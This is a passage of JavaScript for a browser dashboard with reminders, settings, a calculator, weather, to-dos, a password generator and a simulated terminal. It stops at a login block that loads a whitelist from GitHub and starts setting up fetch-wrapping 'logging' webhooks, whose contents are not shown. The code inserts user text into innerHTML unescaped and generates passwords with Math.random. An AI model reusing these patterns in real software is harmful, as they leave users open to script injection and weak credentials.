                                    icon: 'https://cdn-icons-png.flaticon.com/512/2907/2907159.png' // Placeholder icon
                                });
                            }
                        }
                    });
                }, 60000); // Check every minute
            },
            saveReminders: function() {
                localStorage.setItem('reminders', JSON.stringify(this.reminders));
            },
            loadReminders: function() {
                const storedReminders = localStorage.getItem('reminders');
                if (storedReminders) {
                    this.reminders = JSON.parse(storedReminders);
                }
            },
            renderReminders: function() {
                const remindersList = document.getElementById('remindersList');
                remindersList.innerHTML = '';
                // Sort reminders by timestamp, completed ones last
                const sortedReminders = [...this.reminders].sort((a, b) => {
                    if (a.completed !== b.completed) {
                        return a.completed ? 1 : -1;
                    }
                    return a.timestamp - b.timestamp;
                });


                sortedReminders.forEach(r => {
                    const li = document.createElement('li');
                    li.classList.add('reminder-item');
                    if (r.completed) li.classList.add('completed');
                    li.innerHTML = `
                        <span>${r.text} - ${r.date} ${r.time}</span>
                        <div>
                            <button class="complete-btn action-button blue" data-id="${r.id}">${r.completed ? 'Unmark' : 'Complete'}</button>
                            <button class="delete-btn action-button red" data-id="${r.id}">Delete</button>
                        </div>
                    `;
                    remindersList.appendChild(li);
                });

                remindersList.querySelectorAll('.delete-btn').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const id = parseInt(e.target.dataset.id);
                        this.reminders = this.reminders.filter(r => r.id !== id);
                        this.saveReminders();
                        this.renderReminders();
                        this.showNotification('⏰ Reminder deleted.');
                    });
                });
                remindersList.querySelectorAll('.complete-btn').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const id = parseInt(e.target.dataset.id);
                        const reminder = this.reminders.find(r => r.id === id);
                        if (reminder) {
                            reminder.completed = !reminder.completed;
                            this.saveReminders();
                            this.renderReminders();
                            this.showNotification(`⏰ Reminder marked as ${reminder.completed ? 'completed' : 'incomplete'}.`);
                        }
                    });
                });
            },

            // --- Settings Panel Functions ---
            initSettings: function() {
                // Initialize state from LocalStorage or defaults
                document.getElementById('themeSelector').value = localStorage.getItem('theme') || 'dark';
                document.getElementById('autoHideNotifications').checked = localStorage.getItem('autoHideNotifications') !== 'false';
                document.getElementById('announcementScrollSpeed').value = localStorage.getItem('announcementScrollSpeed') || '20';
                document.getElementById('announcementScrollSpeedValue').textContent = document.getElementById('announcementScrollSpeed').value + 's';
                document.getElementById('enableMotivationQuote').checked = localStorage.getItem('enableMotivationQuote') !== 'false';
                if (!document.getElementById('enableMotivationQuote').checked) {
                    document.getElementById('motivationBox').style.display = 'none';
                }
                document.getElementById('desktopNotifications').checked = localStorage.getItem('desktopNotifications') === 'true';
                if (document.getElementById('desktopNotifications').checked && Notification.permission !== "granted") {
                    Notification.requestPermission();
                }
                document.getElementById('reminderSound').checked = localStorage.getItem('reminderSound') !== 'false';
                document.getElementById('notificationDuration').value = localStorage.getItem('notificationDuration') || '3';
                document.getElementById('notificationDurationValue').textContent = document.getElementById('notificationDuration').value + 's';
                document.getElementById('accentColorPicker').value = localStorage.getItem('accentColor') || '#ff914d';
                document.getElementById('mainBgColorPicker').value = localStorage.getItem('mainBgColor') || '#1a1a1a'; // Only applies in JS currently for elements not fully covered by theme class
                document.getElementById('headerBgColorPicker').value = localStorage.getItem('headerBgColor') || '#ff914d'; // Only applies in JS currently
                document.getElementById('enableLogging').checked = localStorage.getItem('enableLogging') !== 'false';


                // Apply initial settings values (especially for theme-related)
                this.applySettingsToDOM();

                // Event listeners for settings changes
                document.getElementById('themeSelector').addEventListener('change', (e) => {
                    if (e.target.value === 'light') {
                        document.body.classList.add('light-theme');
                        document.getElementById('themeToggle').innerText = '☀️ Light Mode';
                    } else {
                        document.body.classList.remove('light-theme');
                        document.getElementById('themeToggle').innerText = '🌙 Dark Mode';
                    }
                    localStorage.setItem('theme', e.target.value);
                    this.applyCustomStyles();
                    this.showNotification(`Theme set to ${e.target.value}.`);
                });
                document.getElementById('autoHideNotifications').addEventListener('change', (e) => {
                    localStorage.setItem('autoHideNotifications', e.target.checked);
                    this.showNotification(`Notifications auto-hide: ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
                });
                document.getElementById('announcementScrollSpeed').addEventListener('input', (e) => {
                    const speed = e.target.value;
                    document.getElementById('announcementScrollSpeedValue').textContent = speed + 's';
                    localStorage.setItem('announcementScrollSpeed', speed);
                    document.getElementById('announcementBar').style.animationDuration = speed + 's';
                });
                document.getElementById('enableMotivationQuote').addEventListener('change', (e) => {
                    document.getElementById('motivationBox').style.display = e.target.checked ? 'flex' : 'none';
                    localStorage.setItem('enableMotivationQuote', e.target.checked);
                    this.showNotification(`Motivation quote: ${e.target.checked ? 'Shown' : 'Hidden'}.`);
                });
                document.getElementById('reminderSound').addEventListener('change', (e) => {
                    localStorage.setItem('reminderSound', e.target.checked);
                    this.showNotification(`Reminder sound: ${e.target.checked ? 'On' : 'Off'}.`);
                });
                document.getElementById('desktopNotifications').addEventListener('change', (e) => {
                    localStorage.setItem('desktopNotifications', e.target.checked);
                    if (e.target.checked && Notification.permission !== "granted") {
                        Notification.requestPermission();
                    }
                    this.showNotification(`Desktop notifications: ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
                });
                document.getElementById('notificationDuration').addEventListener('input', (e) => {
                    const duration = e.target.value;
                    document.getElementById('notificationDurationValue').textContent = duration + 's';
                    localStorage.setItem('notificationDuration', duration);
                });
                document.getElementById('accentColorPicker').addEventListener('input', (e) => {
                    localStorage.setItem('accentColor', e.target.value);
                    this.applyCustomStyles();
                    this.showNotification(`Accent color changed to ${e.target.value}.`);
                });
                // Event listener for main background color picker
                document.getElementById('mainBgColorPicker').addEventListener('input', (e) => {
                    const color = e.target.value;
                    localStorage.setItem('mainBgColor', color);
                    document.documentElement.style.setProperty('--main-bg', color); // Directly update CSS variable
                });
                // Event listener for header background color picker
                document.getElementById('headerBgColorPicker').addEventListener('input', (e) => {
                    const color = e.target.value;
                    localStorage.setItem('headerBgColor', color);
                    // Update header background dynamically using the current lightenColor logic
                    document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${color}, ${this.lightenColor(color, 30)})`;
                });
                document.getElementById('enableLogging').addEventListener('change', (e) => {
                    localStorage.setItem('enableLogging', e.target.checked);
                    this.showNotification(`Analytics logging: ${e.target.checked ? 'Enabled' : 'Disabled'}.`);
                });


                document.getElementById('clearCacheBtn').addEventListener('click', () => {
                    if (confirm('Are you sure you want to clear all local data (notes, reminders, settings)? This cannot be undone.')) {
                        localStorage.clear();
                        alert('All local data cleared. Page will now reload.');
                        location.reload();
                    }
                });

                document.getElementById('dataExportBtn').addEventListener('click', () => {
                    const data = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        data[key] = localStorage.getItem(key);
                    }
                    const jsonString = JSON.stringify(data, null, 2);
                    const blob = new Blob([jsonString], { type: 'application/json' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'private_system_data.json';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    this.showNotification('📤 User data exported.');
                });

                 // Reset buttons functionality
                document.querySelectorAll('.color-picker button').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const pickerId = e.target.previousElementSibling.id;
                        this.resetColorSetting(pickerId);
                    });
                });
            },
            applySettingsToDOM: function() {
                // Apply theme from settings
                const savedTheme = localStorage.getItem('theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light-theme');
                    document.getElementById('themeToggle').innerText = '☀️ Light Mode';
                } else {
                    document.body.classList.remove('light-theme');
                    document.getElementById('themeToggle').innerText = '🌙 Dark Mode';
                }

                // Apply scroll speed
                const scrollSpeed = localStorage.getItem('announcementScrollSpeed') || '20';
                document.getElementById('announcementBar').style.animationDuration = scrollSpeed + 's';
                document.getElementById('announcementScrollSpeedValue').textContent = scrollSpeed + 's';

                // Apply motivation quote visibility
                if (localStorage.getItem('enableMotivationQuote') === 'false') {
                    document.getElementById('motivationBox').style.display = 'none';
                } else {
                    document.getElementById('motivationBox').style.display = 'flex';
                }

                // Apply Custom Accent Colors etc. by re-calling applyCustomStyles
                this.applyCustomStyles();

                // Apply custom main background color if set
                const mainBgColor = localStorage.getItem('mainBgColor');
                if (mainBgColor) {
                    document.documentElement.style.setProperty('--main-bg', mainBgColor);
                } else {
                    document.documentElement.style.setProperty('--main-bg', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
                }
                // Update color pickers to reflect current active value (whether from localstorage or CSS var)
                document.getElementById('mainBgColorPicker').value = localStorage.getItem('mainBgColor') || (document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
                document.getElementById('headerBgColorPicker').value = localStorage.getItem('headerBgColor') || (document.body.classList.contains('light-theme') ? this.lightenColor(localStorage.getItem('accentColor') || '#ff914d', 10) : (localStorage.getItem('accentColor') || '#ff914d'));

            },
            resetColorSetting: function(pickerId) {
                switch (pickerId) {
                    case 'accentColorPicker':
                        localStorage.removeItem('accentColor');
                        document.getElementById('accentColorPicker').value = '#ff914d';
                        this.showNotification('Accent color reset.');
                        break;
                    case 'mainBgColorPicker':
                        localStorage.removeItem('mainBgColor');
                        document.getElementById('mainBgColorPicker').value = '#1a1a1a'; // Default dark
                        document.documentElement.style.setProperty('--main-bg', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
                        this.showNotification('Main background color reset.');
                        break;
                    case 'headerBgColorPicker':
                        localStorage.removeItem('headerBgColor');
                        document.getElementById('headerBgColorPicker').value = '#ff914d'; // Default accent color
                        document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${document.getElementById('accentColorPicker').value}, ${this.lightenColor(document.getElementById('accentColorPicker').value, 30)})`;
                        this.showNotification('Header background reset.');
                        break;
                }
                this.applyCustomStyles(); // Reapply all custom styles to ensure consistency
            },

            // --- Calculator Functions ---
            calculator: {
                output: document.getElementById('calculatorOutput'),
                currentOperand: '0',
                previousOperand: '',
                operation: null,
                shouldResetScreen: false,

                init: function() {
                    const buttons = document.querySelectorAll('#calculatorPanel button');
                    buttons.forEach(button => {
                        button.addEventListener('click', (e) => this.handleClick(e.target.dataset.value));
                    });
                    document.addEventListener('keydown', (e) => this.handleKeyboard(e.key));
                    this.updateDisplay();
                },

                handleClick: function(value) {
                    if (value === 'clear') this.clear();
                    else if (value === '+/-') this.toggleSign();
                    else if (value === '%') this.percentage();
                    else if (value === '=' || value === 'Enter') this.operate();
                    else if (['+', '-', '*', '/'].includes(value)) this.chooseOperation(value);
                    else this.appendNumber(value);
                    this.updateDisplay();
                    dashboard.showNotification(`🧮 Calculator: ${value}`);
                },

                handleKeyboard: function(key) {
                    if (key >= '0' && key <= '9' || key === '.') {
                        this.appendNumber(key);
                    } else if (key === '+' || key === '-' || key === '*' || key === '/') {
                        this.chooseOperation(key);
                    } else if (key === '=' || key === 'Enter') {
                        this.operate();
                    } else if (key === 'Escape' || key === 'Delete') {
                        this.clear();
                    }
                    this.updateDisplay();
                },

                clear: function() {
                    this.currentOperand = '0';
                    this.previousOperand = '';
                    this.operation = null;
                    this.shouldResetScreen = false;
                },

                appendNumber: function(number) {
                    if (this.currentOperand === '0' || this.shouldResetScreen) {
                        this.currentOperand = number;
                        this.shouldResetScreen = false;
                    } else if (number === '.' && this.currentOperand.includes('.')) {
                        return;
                    } else {
                        this.currentOperand += number;
                    }
                },

                toggleSign: function() {
                    this.currentOperand = (parseFloat(this.currentOperand) * -1).toString();
                },

                percentage: function() {
                    this.currentOperand = (parseFloat(this.currentOperand) / 100).toString();
                },

                chooseOperation: function(operator) {
                    if (this.currentOperand === '') return;
                    if (this.previousOperand !== '') {
                        this.operate();
                    }
                    this.operation = operator;
                    this.previousOperand = this.currentOperand;
                    this.shouldResetScreen = true;
                },

                operate: function() {
                    let computation;
                    const prev = parseFloat(this.previousOperand);
                    const current = parseFloat(this.currentOperand);
                    if (isNaN(prev) || isNaN(current)) return;

                    switch (this.operation) {
                        case '+':
                            computation = prev + current;
                            break;
                        case '-':
                            computation = prev - current;
                            break;
                        case '*':
                            computation = prev * current;
                            break;
                        case '/':
                            computation = prev / current;
                            break;
                        default:
                            return;
                    }
                    this.currentOperand = computation.toString();
                    this.operation = null;
                    this.previousOperand = '';
                    this.shouldResetScreen = true;
                },

                updateDisplay: function() {
                    this.output.textContent = this.currentOperand;
                }
            },
            initCalculator: function() {
                this.calculator.init();
            },

            // --- Unit Converter Functions ---
            unitConverter: {
                units: {
                    length: {
                        'meter': 1, 'kilometer': 1000, 'centimeter': 0.01, 'millimeter': 0.001,
                        'mile': 1609.34, 'yard': 0.9144, 'foot': 0.3048, 'inch': 0.0254
                    },
                    weight: {
                        'kilogram': 1, 'gram': 0.001, 'milligram': 0.000001, 'metric ton': 1000,
                        'pound': 0.453592, 'ounce': 0.0283495
                    },
                    temperature: { // Base is Celsius
                        'celsius': (val) => val,
                        'fahrenheit': (val) => (val - 32) * 5 / 9,
                        'kelvin': (val) => val - 273.15
                    },
                    volume: {
                        'liter': 1, 'milliliter': 0.001, 'cubic meter': 1000, 'gallon': 3.78541,
                        'quart': 0.946353, 'pint': 0.473176, 'fluid ounce': 0.0295735
                    }
                },
                temperature_converters: { // Converts to target unit from Celsius base
                    'celsius': (val) => val,
                    'fahrenheit': (val) => (val * 9 / 5) + 32,
                    'kelvin': (val) => val + 273.15
                },
                conversionType: document.getElementById('conversionType'),
                convertValue: document.getElementById('convertValue'),
                convertFromUnit: document.getElementById('convertFromUnit'),
                convertToUnit: document.getElementById('convertToUnit'),
                conversionResult: document.getElementById('conversionResult'),
                performConversionBtn: document.getElementById('performConversionBtn'),

                init: function() {
                    this.conversionType.addEventListener('change', () => this.populateUnits());
                    this.performConversionBtn.addEventListener('click', () => this.performConversion());
                    this.populateUnits(); // Initial population
                },

                populateUnits: function() {
                    const type = this.conversionType.value;
                    const unitsForType = this.units[type];
                    this.convertFromUnit.innerHTML = '';
                    this.convertToUnit.innerHTML = '';

                    for (const unit in unitsForType) {
                        const optionFrom = document.createElement('option');
                        optionFrom.value = unit;
                        optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
                        this.convertFromUnit.appendChild(optionFrom);

                        const optionTo = document.createElement('option');
                        optionTo.value = unit;
                        optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
                        this.convertToUnit.appendChild(optionTo);
                    }
                    // Select default units if they exist or fallback to first option
                    this.convertFromUnit.value = Object.keys(unitsForType)[0] || '';
                    this.convertToUnit.value = Object.keys(unitsForType)[1] || Object.keys(unitsForType)[0] || '';
                    this.performConversion(); // Perform initial conversion after unit change
                },

                performConversion: function() {
                    const value = parseFloat(this.convertValue.value);
                    const type = this.conversionType.value;
                    const fromUnit = this.convertFromUnit.value;
                    const toUnit = this.convertToUnit.value;

                    if (isNaN(value)) {
                        this.conversionResult.textContent = 'Invalid input.';
                        return;
                    }
                    if (!fromUnit || !toUnit) {
                        this.conversionResult.textContent = 'Select units.';
                        return;
                    }

                    let result;
                    if (type === 'temperature') {
                        // Convert 'from' value to base Celsius
                        const celsiusValue = this.units[type][fromUnit](value);
                        // Convert base Celsius to 'to' unit
                        result = this.temperature_converters[toUnit](celsiusValue);
                    } else {
                        // Convert 'from' value to base unit (e.g., meters for length)
                        const baseValue = value * this.units[type][fromUnit];
                        // Convert base unit value to 'to' unit
                        result = baseValue / this.units[type][toUnit];
                    }
                    this.conversionResult.textContent = `${result.toFixed(4)} ${toUnit}`;
                    dashboard.showNotification(`🔄 Converted ${value} ${fromUnit} to ${result.toFixed(2)} ${toUnit}.`);
                }
            },
            initUnitConverter: function() {
                this.unitConverter.init();
            },

            // --- Weather Widget Functions ---
            weatherWidget: {
                locationInput: document.getElementById('weatherLocationInput'),
                getWeatherBtn: document.getElementById('getWeatherBtn'),
                weatherInfo: document.getElementById('weatherInfo'),
                weatherCity: document.getElementById('weatherCity'),
                weatherTemp: document.getElementById('weatherTemp'),
                weatherDesc: document.getElementById('weatherDesc'),
                weatherHumidity: document.getElementById('weatherHumidity'),
                weatherWind: document.getElementById('weatherWind'),
                apiKey: 'YOUR_OPENWEATHERMAP_API_KEY', // Replace with a valid API key

                init: function() {
                    this.getWeatherBtn.addEventListener('click', () => this.getWeather());
                },

                getWeather: async function() {
                    const location = this.locationInput.value.trim();
                    if (!location) {
                        dashboard.showNotification('❗️ Please enter a city or zip code.');
                        return;
                    }

                    if (this.apiKey === 'YOUR_OPENWEATHERMAP_API_KEY') {
                        this.weatherInfo.style.display = 'block';
                        this.weatherCity.textContent = 'API Key Required!';
                        this.weatherTemp.textContent = 'N/A';
                        this.weatherDesc.textContent = 'Please update your JavaScript with a valid OpenWeatherMap API key.';
                        this.weatherHumidity.textContent = 'N/A';
                        this.weatherWind.textContent = 'N/A';
                        return;
                    }

                    const url = `https://api.openweathermap.org/data/2.5/weather?q=${location}&appid=${this.apiKey}&units=metric`; // units=metric for Celsius

                    try {
                        const response = await fetch(url);
                        const data = await response.json();

                        if (data.cod === 200) {
                            this.weatherCity.textContent = data.name;
                            this.weatherTemp.textContent = `${data.main.temp}°C (${(data.main.temp * 9/5 + 32).toFixed(1)}°F)`;
                            this.weatherDesc.textContent = data.weather[0].description;
                            this.weatherHumidity.textContent = `${data.main.humidity}%`;
                            this.weatherWind.textContent = `${data.wind.speed} m/s`;
                            this.weatherInfo.style.display = 'block';
                            dashboard.showNotification(`☁️ Weather for ${data.name} loaded.`);
                        } else {
                            this.weatherInfo.style.display = 'block';
                            this.weatherCity.textContent = 'Error!';
                            this.weatherTemp.textContent = '';
                            this.weatherDesc.textContent = data.message || 'Could not fetch weather data.';
                            this.weatherHumidity.textContent = '';
                            this.weatherWind.textContent = '';
                            dashboard.showNotification(`❗️ Could not get weather: ${data.message || 'Unknown error'}`);
                        }
                    } catch (error) {
                        console.error('Error fetching weather:', error);
                        this.weatherInfo.style.display = 'block';
                        this.weatherCity.textContent = 'Network Error!';
                        this.weatherTemp.textContent = '';
                        this.weatherDesc.textContent = 'Please check your connection.';
                        this.weatherHumidity.textContent = '';
                        this.weatherWind.textContent = '';
                        dashboard.showNotification('❗️ Network error fetching weather.');
                    }
                }
            },
            initWeatherWidget: function() {
                this.weatherWidget.init();
            },

            // --- To-Do List Functions ---
            todoApp: {
                tasks: [],
                newTaskInput: document.getElementById('newTaskInput'),
                addTaskBtn: document.getElementById('addTaskBtn'),
                taskList: document.getElementById('taskList'),

                init: function() {
                    this.loadTasks();
                    this.renderTasks();
                    this.addTaskBtn.addEventListener('click', () => this.addTask());
                    document.getElementById('newTaskInput').addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') this.addTask();
                    });
                },

                addTask: function() {
                    const text = this.newTaskInput.value.trim();
                    if (text) {
                        this.tasks.push({ id: Date.now(), text, completed: false });
                        this.saveTasks();
                        this.renderTasks();
                        this.newTaskInput.value = '';
                        dashboard.showNotification(`✅ Task "${text}" added.`);
                    }
                },

                toggleTaskComplete: function(id) {
                    const task = this.tasks.find(t => t.id === id);
                    if (task) {
                        task.completed = !task.completed;
                        this.saveTasks();
                        this.renderTasks();
                        dashboard.showNotification(`✅ Task marked as ${task.completed ? 'completed' : 'incomplete'}.`);
                        let tasksCompleted = parseInt(localStorage.getItem('stats_tasks_completed') || '0');
                        localStorage.setItem('stats_tasks_completed', tasksCompleted + (task.completed ? 1 : -1));
                        dashboard.updateStatsDisplay();
                    }
                },

                deleteTask: function(id) {
                    this.tasks = this.tasks.filter(t => t.id !== id);
                    this.saveTasks();
                    this.renderTasks();
                    dashboard.showNotification('✅ Task deleted.');
                },

                saveTasks: function() {
                    localStorage.setItem('tasks', JSON.stringify(this.tasks));
                },

                loadTasks: function() {
                    const storedTasks = localStorage.getItem('tasks');
                    if (storedTasks) {
                        this.tasks = JSON.parse(storedTasks);
                    }
                },

                renderTasks: function() {
                    this.taskList.innerHTML = '';
                    this.tasks.forEach(task => {
                        const li = document.createElement('li');
                        li.classList.add('task-item');
                        if (task.completed) li.classList.add('completed');
                        li.innerHTML = `
                            <span class="task-text">${task.text}</span>
                            <div>
                                <button class="toggle-complete action-button" data-id="${task.id}">${task.completed ? 'Undo' : 'Complete'}</button>
                                <button class="delete-task action-button red" data-id="${task.id}">Delete</button>
                            </div>
                        `;
                        this.taskList.appendChild(li);
                    });

                    this.taskList.querySelectorAll('.toggle-complete').forEach(button => {
                        button.addEventListener('click', (e) => {
                            this.toggleTaskComplete(parseInt(e.target.dataset.id));
                        });
                    });

                    this.taskList.querySelectorAll('.delete-task').forEach(button => {
                        button.addEventListener('click', (e) => {
                            this.deleteTask(parseInt(e.target.dataset.id));
                        });
                    });
                }
            },
            initTodoApp: function() {
                this.todoApp.init();
            },

            // --- Password Generator Functions ---
            passwordGenerator: {
                generatedPasswordOutput: document.getElementById('generatedPassword'),
                passwordLengthInput: document.getElementById('passwordLength'),
                passwordLengthValueSpan: document.getElementById('passwordLengthValue'),
                includeUppercase: document.getElementById('includeUppercase'),
                includeLowercase: document.getElementById('includeLowercase'),
                includeNumbers: document.getElementById('includeNumbers'),
                includeSymbols: document.getElementById('includeSymbols'),
                generatePasswordBtn: document.getElementById('generatePasswordBtn'),
                copyPasswordBtn: document.getElementById('copyPasswordBtn'),

                init: function() {
                    this.passwordLengthInput.addEventListener('input', () => {
                        this.passwordLengthValueSpan.textContent = this.passwordLengthInput.value;
                    });
                    this.generatePasswordBtn.addEventListener('click', () => this.generatePassword());
                    this.copyPasswordBtn.addEventListener('click', () => this.copyPassword());
                    this.generatePassword(); // Generate an initial password
                },

                generatePassword: function() {
                    const length = parseInt(this.passwordLengthInput.value);
                    const useUppercase = this.includeUppercase.checked;
                    const useLowercase = this.includeLowercase.checked;
                    const useNumbers = this.includeNumbers.checked;
                    const useSymbols = this.includeSymbols.checked;

                    let characterPool = '';
                    if (useUppercase) characterPool += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                    if (useLowercase) characterPool += 'abcdefghijklmnopqrstuvwxyz';
                    if (useNumbers) characterPool += '0123456789';
                    if (useSymbols) characterPool += '!@#$%^&*()_-+=<>?/{}[]~|';

                    if (characterPool.length === 0) {
                        this.generatedPasswordOutput.textContent = 'Select at least one character type!';
                        dashboard.showNotification('❗️ Select at least one character type for password!');
                        return;
                    }

                    let password = '';
                    for (let i = 0; i < length; i++) {
                        const randomIndex = Math.floor(Math.random() * characterPool.length);
                        password += characterPool[randomIndex];
                    }

                    this.generatedPasswordOutput.textContent = password;
                    dashboard.showNotification('🔒 New password generated.');
                },

                copyPassword: function() {
                    const password = this.generatedPasswordOutput.textContent;
                    navigator.clipboard.writeText(password)
                        .then(() => dashboard.showNotification('📋 Password copied to clipboard!'))
                        .catch(err => console.error('Failed to copy password:', err));
                }
            },
            initPasswordGenerator: function() {
                this.passwordGenerator.init();
            },

            // --- Terminal Simulation Functions ---
            terminal: {
                outputElement: document.getElementById('terminalOutput'),
                inputElement: document.getElementById('terminalInput'),
                history: [],
                historyIndex: -1,
                user: 'guest',
                currentDir: '/',

                init: function() {
                    this.inputElement.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') {
                            this.handleCommand(this.inputElement.value);
                            this.inputElement.value = '';
                            e.preventDefault(); // Prevent newline in input
                        } else if (e.key === 'ArrowUp') {
                            e.preventDefault();
                            this.recallHistory(-1);
                        } else if (e.key === 'ArrowDown') {
                            e.preventDefault();
                            this.recallHistory(1);
                        }
                    });
                    this.inputElement.focus();
                },

                print: function(text, color = '0f0') {
                    const span = document.createElement('span');
                    span.textContent = text;
                    span.style.color = `#${color}`;
                    this.outputElement.appendChild(span);
                    this.outputElement.appendChild(document.createTextNode('\n'));
                    this.outputElement.scrollTop = this.outputElement.scrollHeight; // Scroll to bottom
                },

                displayPrompt: function() {
                    this.outputElement.appendChild(document.createTextNode(`$ `));
                    this.outputElement.scrollTop = this.outputElement.scrollHeight;
                },

                handleCommand: function(command) {
                    if (command.trim() === '') {
                        this.displayPrompt();
                        return;
                    }
                    this.print(`$ ${command}`, 'fff'); // Echo command in white

                    this.history.unshift(command); // Add to history
                    if (this.history.length > 50) this.history.pop(); // Keep history size
                    this.historyIndex = -1; // Reset history index

                    const parts = command.split(' ').filter(p => p !== '');
                    const cmd = parts[0].toLowerCase();
                    const args = parts.slice(1);

                    switch (cmd) {
                        case 'help':
                            this.print('Available commands:');
                            this.print('  help                      - Show this help message.');
                            this.print('  clear                     - Clear the terminal screen.');
                            this.print('  echo [text]               - Display a line of text.');
                            this.print('  date                      - Display current date and time.');
                            this.print('  whoami                    - Display current user.');
                            this.print('  neofetch                  - Display system information (simulated).');
                            break;
                        case 'clear':
                            this.outputElement.innerHTML = '';
                            break;
                        case 'echo':
                            this.print(args.join(' '));
                            break;
                        case 'date':
                            this.print(new Date().toLocaleString());
                            break;
                        case 'whoami':
                            this.print(this.user);
                            break;
                        case 'neofetch': // Simulated
                            this.print(`  █████████▄
  █▄██████████▄          ${this.user}@privatesystem`);
                            this.print(`  █  ▀████████▄          ----------`);
                            this.print(`  █▄ █  █ █ ████▄         OS: Web (HTML/CSS/JS)`);
                            this.print(`  █▀█▄ ▀  █▄ ████          Host: Browser Environment`);
                            this.print(`  █ █▄██▀ ▄██ ██           Uptime: ${document.getElementById('statsUptime').textContent}`);
                            this.print(`  █▄███▄█████▀ ███         Kernel: Simulated 1.0`);
                            this.print(`  ▀█████▀██▀ ▄████         CPU: Virtual Processor`);
                            this.print(`    ▀█▄█▀██▀███▄          RAM: Simulated Memory`);
                            this.print(`      ▄▄▄▀█▄▄█           Theme: ${localStorage.getItem('theme') === 'light' ? 'Light' : 'Dark'} `);
                            this.print(`    ██████▄▄               Term: Simulated PrivateTerm`);
                            break;
                        default:
                            this.print(`Command not found: ${cmd}`);
                            break;
                    }
                    this.displayPrompt();
                    dashboard.showNotification(`📟 Terminal command: '${cmd}'`);
                },

                recallHistory: function(direction) { // -1 for up, 1 for down
                    if (this.history.length === 0) return;

                    this.historyIndex += direction;
                    if (this.historyIndex >= this.history.length) {
                        this.historyIndex = -1; // Back to empty input
                        this.inputElement.value = '';
                    } else if (this.historyIndex < -1) {
                        this.historyIndex = this.history.length - 1; // Wrap around to end
                        this.inputElement.value = this.history[this.historyIndex];
                    } else if (this.historyIndex >= 0) {
                        this.inputElement.value = this.history[this.historyIndex];
                    }
                }
            },
            initTerminal: function() {
                this.terminal.init();
            },

            // --- Media Player (YouTube Embed) ---
            mediaPlayer: {
                youtubeIdInput: document.getElementById('youtubeIdInput'),
                loadYoutubeBtn: document.getElementById('loadYoutubeBtn'),
                youtubePlayerDiv: document.getElementById('youtubePlayer'),

                init: function() {
                    this.loadYoutubeBtn.addEventListener('click', () => this.loadVideo());
                },

                loadVideo: function() {
                    const input = this.youtubeIdInput.value.trim();
                    let videoId;

                    // Regex to extract video ID from various YouTube URL formats
                    const urlRegex = /(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
                    const match = input.match(urlRegex);

                    if (match && match[1]) {
                        videoId = match[1];
                    } else if (input.length === 11 && /^[a-zA-Z0-9_-]+$/.test(input)) {
                        videoId = input; // Assume direct ID if it looks like one
                    } else {
                        dashboard.showNotification('❗️ Invalid YouTube URL or Video ID.', 5000);
                        this.youtubePlayerDiv.innerHTML = "Video player will load here...";
                        return;
                    }

                    this.youtubePlayerDiv.innerHTML = `
                        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/${videoId}"
                        frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowfullscreen></iframe>
                    `;
                    dashboard.showNotification(`📺 YouTube video loaded: ${videoId}`);
                }
            },
            initMediaPlayer: function() {
                this.mediaPlayer.init();
            },

            // --- Usage Statistics Functions ---
            updateStatsDisplay: function() {
                document.getElementById('statsClicks') && (document.getElementById('statsClicks').innerText = localStorage.getItem('stats_clicks') || '0');
                document.getElementById('statsCanvasUsed') && (document.getElementById('statsCanvasUsed').innerText = localStorage.getItem('stats_canvas_used') || '0');
                document.getElementById('statsThemeToggles') && (document.getElementById('statsThemeToggles').innerText = localStorage.getItem('stats_theme_toggles') || '0');
                document.getElementById('statsRemindersSet') && (document.getElementById('statsRemindersSet').innerText = localStorage.getItem('stats_reminders_set') || '0');
                document.getElementById('statsTasksCompleted') && (document.getElementById('statsTasksCompleted').innerText = localStorage.getItem('stats_tasks_completed') || '0');
            }
        };

        // Pre-Login and Pre-Dashboard Animations Logic
        document.addEventListener('DOMContentLoaded', () => {
            const loadingScreen1 = document.getElementById('loadingScreen1');
            const loadingText1 = document.getElementById('loadingText1');
            const loginBox = document.getElementById('loginBox');
            const loadingScreen2 = document.getElementById('loadingScreen2');
            const loadingText2 = document.getElementById('loadingText2');
            const dashboardElem = document.getElementById('dashboard');
            const announcementBar = document.getElementById('announcementBar');


            // Step 1: Show first loading screen
            loadingScreen1.style.display = 'flex';
            loadingText1.style.animation = 'typing 2s steps(20, end) forwards, blink-caret .75s step-end infinite';
            
            setTimeout(() => {
                loadingScreen1.classList.add('fade-out');
                loadingScreen1.addEventListener('transitionend', () => {
                    loadingScreen1.style.display = 'none';
                    // Step 2: Show login box
                    loginBox.style.display = 'block';
                    dashboard.applySettingsToDOM(); // Apply settings here too, as login is now visible
                }, { once: true });
            }, 3000); // Display for 3 seconds


            // Store original fetch for later logging, if needed (replicate original webhooks behavior if `enableLogging` is true)
            const originalFetch = window.fetch;

            // Login System JavaScript (wrapped in an IIFE)
            (() => {
                const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

                // Webhooks for the new logging systems
                const loggingWebhooks = {
